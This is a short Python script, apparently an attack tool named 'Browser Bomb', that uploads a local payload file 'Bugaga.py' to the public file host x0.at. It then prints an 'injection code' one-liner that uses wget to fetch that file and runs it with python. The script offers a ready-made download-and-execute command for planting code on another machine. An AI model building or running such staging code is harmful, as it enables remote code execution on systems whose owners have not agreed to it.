import io
import requests
import random

print("""
 |  |--.----.-----.--.--.--.-----.-----.----.
 |  _  |   _|  _  |  |  |  |__ --|  -__|   _|
 |_____|__| |_____|________|_____|_____|__|
              _______                __
             |   _   .-----.--------|  |--.
             |.  1   |  _  |        |  _  |
             |.  _   |_____|__|__|__|_____|
             |:  1    \ .
             |::.. .  /
             `-------'
[>] Version: 2.0""")
_name = ''

for x in range(12):
	_name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
file = io.BytesIO(open('Bugaga.py', 'rb').read())
file.name = _name + '.py'
try:
	x0at = requests.post('https://x0.at', files={'file': file})
except ConnectionError as e:
	pass
url = x0at.text
code = f'import os;os.system("wget '+url+' Bugaga.py");os.system("python Bugaga.py")'
print('[!] The injection code: ' + str(code))